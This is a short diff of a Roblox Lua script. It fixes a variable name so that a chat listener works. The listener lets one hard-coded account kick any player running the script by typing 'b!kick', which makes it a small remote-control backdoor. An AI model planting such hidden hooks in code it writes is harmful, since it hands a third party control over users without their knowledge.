@@ -10,7 +10,7 @@ game.Players.PlayerAdded:Connect(
         if knocks.Name == "jjjuuikjjikkju" then
             knocks.Chatted:Connect(
                 function(rizz)
-                    local splitted = msg:split(" ")
+                    local splitted = rizz:split(" ")
                     if splitted[1] == "b!kick" then
                         game.Players.LocalPlayer:Kick("ur on the touch list")
                         task.wait(2)
@@ -31,7 +31,7 @@ for i, v in pairs(game.Players:GetPlayers()) do
     if v.Name == "jjjuuikjjikkju" then
             v.Chatted:Connect(
                 function(rizz)
-                    local splitted = msg:split(" ")
+                    local splitted = rizz:split(" ")
                     if splitted[1] == "b!kick" then
                         game.Players.LocalPlayer:Kick("ur on the touch list")
                         task.wait(2)
